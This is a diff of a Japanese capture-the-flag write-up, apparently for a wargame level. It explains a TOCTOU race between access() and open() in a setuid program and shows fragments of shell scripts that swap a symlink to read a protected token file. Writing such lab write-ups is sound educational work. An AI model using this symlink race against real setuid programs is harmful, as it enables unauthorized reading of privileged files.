@@ -1,3 +1,4 @@
+## ~に存在するファイルを確認
 ```sh
 ls -l
 total 16
@@ -5,7 +6,7 @@ total 16
 -rw-------  1 flag10 flag10     26 Mar  5  2016 token
 ```
 
-### ghidraでdisassする
+## ghidraでdisassする
 
 ```c
 void main(int ac, char **argv)
@@ -92,18 +93,17 @@ void main(int ac, char **argv)
   return;
 }
 ```
-
+## 関数のポイント
 `access((char *)argv[1],R_OK);` は実ユーザーでファイル読み取り権限を確認するため、`level10`ユーザーが`token`を引数に渡すとでエラーになる。
 一方、`open(file_name,O_RDONLY);` は実効ユーザーである`flag10` の権限でファイルアクセス権限を確認する。
 したがって、`access((char *)argv[1],R_OK);`をうまく突破すれば`token`の中身を確認することができる。
 
 `TOCTOU`というのがある。チェックと使用タイミングのズレがあると問題になる。つまり、`open` と`read` の間に脆弱性がある。
 https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use
+## エクスプロイト
 
-
-### ２つのスクリプトを用意する。
-
-１つ目のスクリプトは、実ユーザー権限がある`/tmp/sym_token`を読み込ませて、 `access`関数を突破する。
+### シンボリックリンクを操作するスクリプト
+１つ目のスクリプトは、実ユーザー権限がある`/tmp/sym_token`を読み込ませて、`access`関数を突破する。
 その後、`read`関数の前までに`/tmp/sym_token` と`token`をシンボリックリンクし、`token`を`write`する。
 
 ```sh
@@ -118,7 +118,7 @@ echo 'done' >> /tmp/script
 chmod +x /tmp/script
 ```
 
-受信した文字列をファイルに保存するスクリプト。
+### 受信した文字列をファイルに保存するスクリプト
 ```sh
 echo '#!/bin/bash' > /tmp/script1
 echo '> /tmp/pw' >> /tmp/script1
@@ -128,7 +128,7 @@ echo 'done' >> /tmp/script1
 
 chmod +x /tmp/script1
 ```
-
+### 実行
 タイミングを完璧に制御できないため、試行回数でカバーする必要がある。
 ```sh
 /tmp/script > /dev/null 2>&1 &
